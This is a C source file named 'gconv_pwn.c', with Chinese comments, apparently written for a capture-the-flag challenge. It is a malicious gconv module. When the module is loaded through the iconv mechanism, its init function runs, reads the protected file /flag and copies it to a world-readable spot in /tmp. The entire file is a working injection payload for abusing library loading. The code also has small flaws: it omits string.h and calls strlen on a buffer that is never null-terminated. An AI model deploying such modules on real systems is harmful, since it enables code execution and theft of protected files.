// gconv_pwn.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// gconv 模块必须实现的函数
int gconv_init(void) {
    // 这个函数在模块加载时执行
    FILE *fp = fopen("/flag", "r");
    if (fp) {
        char flag[256];
        fread(flag, 1, sizeof(flag), fp);
        fclose(fp);
        
        // 写入可读位置
        fp = fopen("/tmp/flag.txt", "w");
        if (fp) {
            fwrite(flag, 1, strlen(flag), fp);
            fclose(fp);
        }
    }
    return 0;
}

int gconv(void) {
    return 0;
}